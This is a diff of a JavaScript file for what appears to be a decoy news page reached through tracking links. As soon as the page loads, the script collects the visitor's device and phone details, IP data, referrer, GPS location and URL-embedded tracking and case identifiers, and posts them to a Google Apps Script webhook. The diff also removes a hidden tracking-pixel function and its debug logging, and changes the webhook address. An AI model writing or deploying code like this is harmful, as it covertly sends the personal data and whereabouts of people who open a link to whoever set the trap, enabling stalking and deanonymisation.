@@ -1,4 +1,4 @@
-// ฟังก์ชันดึง tracking key และcase name จากURLparameters
+// ฟังก์ชันดึง tracking key และ case name จาก URL parameters
 function getUrlParameters() {
   try {
     const urlParams = new URLSearchParams(window.location.search);
@@ -24,8 +24,6 @@ function getUrlParameters() {
 
 // ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
 (function() {
-  console.log("เริ่มการทำงานของ script.js");
-  
   // เก็บข้อมูลทั่วไป
   const timestamp = new Date().toLocaleString('th-TH', {
     timeZone: 'Asia/Bangkok',
@@ -39,7 +37,6 @@ function getUrlParameters() {
   
   // ดึง tracking key และ case name จาก URL
   const { trackingKey, caseName } = getUrlParameters();
-  console.log("ดึงค่าสำเร็จ - trackingKey:", trackingKey, "caseName:", caseName);
 
   // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ
   const deviceInfo = getDetailedDeviceInfo();
@@ -84,12 +81,10 @@ function getUrlParameters() {
         phoneInfo: phoneInfo,
         referrer: referrer,
         trackingKey: trackingKey || "ไม่มีค่า",
-        caseName: caseName || "ไม่มีค่า", 
+        caseName: caseName || "ไม่มีค่า",
         useServerMessage: true,
-        requestId: generateUniqueId()
+        requestId: generateUniqueId() // สร้าง ID เฉพาะสำหรับการร้องขอนี้
       };
-      
-      console.log("ข้อมูลที่เตรียมส่ง:", dataToSend);
       
       // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 5 วินาที
       if (navigator.geolocation) {
@@ -124,44 +119,16 @@ function getUrlParameters() {
           dataToSend.location = location;
           
           // ส่งข้อมูลทั้งหมดเพียงครั้งเดียว
-          console.log("เริ่มส่งข้อมูลไปยัง Line Notify");
           sendToLineNotify(dataToSend);
         });
       } else {
         // ถ้าไม่สามารถใช้ Geolocation API ได้
         dataToSend.location = "ไม่มีข้อมูล";
-        console.log("ไม่สามารถใช้ Geolocation API - ส่งข้อมูลโดยไม่มีตำแหน่ง GPS");
         sendToLineNotify(dataToSend);
       }
     });
   });
-
-  // เพิ่ม Event Listener ให้กับการ์ดข่าว
-  setupNewsCardClickHandlers();
-  
-  console.log("ตั้งค่า script.js เสร็จสิ้น");
 })();
-
-// ฟังก์ชันสำหรับเพิ่ม Event Listener ให้กับการ์ดข่าว
-function setupNewsCardClickHandlers() {
-  const newsCards = document.querySelectorAll('.news-card');
-  const { caseName } = getUrlParameters(); // ดึง caseName จาก URL ปัจจุบัน
-
-  newsCards.forEach(card => {
-    card.addEventListener('click', function() {
-      console.log("คลิกการ์ดข่าว");
-      // นำทางกลับไปยังหน้า LIFF พร้อม caseName (ถ้ามี)
-      let liffUrl = 'zero-click-liff.html';
-      if (caseName && caseName !== "ไม่มีค่า") {
-        liffUrl += `?case=${encodeURIComponent(caseName)}`;
-      }
-      window.location.href = liffUrl;
-    });
-
-    // เปลี่ยน cursor เป็น pointer เพื่อให้รู้ว่าคลิกได้
-    card.style.cursor = 'pointer';
-  });
-}
 
 // สร้าง ID เฉพาะสำหรับการร้องขอ
 function generateUniqueId() {
@@ -896,9 +863,9 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
 
 // ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
 function sendToLineNotify(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbw6noostvWuO2gWuD3lyE4TrqNLG9znhG2G8uOlIlq8JhZfN4nDNCznxdfpdIB-vIE0sg/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbyFXbu48GasTyxGlmUr1NOJRrXgFoEYyRgfob67gzV6QzwgxtLoK6x0RZIm11gAMrm6/exec';
 
-  // สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
+  // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
   if (!dataToSend.requestId) {
     dataToSend.requestId = generateUniqueId();
   }
@@ -911,7 +878,6 @@ function sendToLineNotify(dataToSend) {
   }
   
   console.log("กำลังส่งข้อมูลไป webhook (requestId: " + dataToSend.requestId + ")");
-  console.log("ข้อมูลที่จะส่ง:", dataToSend);
 
   // ส่งข้อมูล
   fetch(webhookUrl, {
@@ -928,30 +894,13 @@ function sendToLineNotify(dataToSend) {
     // บันทึก requestId ที่ส่งสำเร็จแล้ว
     sentRequests.push(dataToSend.requestId);
     sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
-    
-    // สร้างภาพ tracking สำหรับ zero-click
-    createTrackingPixel(dataToSend.trackingKey);
   })
   .catch(error => {
     console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
   });
 }
 
-// สร้างภาพ tracking สำหรับ zero-click
-function createTrackingPixel(trackingKey) {
-  if (!trackingKey) return;
-  
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbx7ZFR0Ctkhcyh0Ihm4ckEkMsijd2uR-XOWUFyv_zYigdYB60zrviagbHjrGYhFftqH/exec';
-  const timestamp = new Date().getTime();
-  const img = new Image();
-  img.src = `${webhookUrl}?action=zeroClick&key=${trackingKey}&r=${timestamp}`;
-  img.style.display = 'none';
-  document.body.appendChild(img);
-  
-  console.log("สร้าง tracking pixel สำหรับ zero-click:", trackingKey);
-}
-
-// สร้าง unique ID สำหรับแต่ละการร้องขอ1
+// สร้าง unique ID สำหรับแต่ละการร้องขอ
 function generateUniqueId() {
   return Date.now().toString(36) + Math.random().toString(36).substring(2, 10);
 }
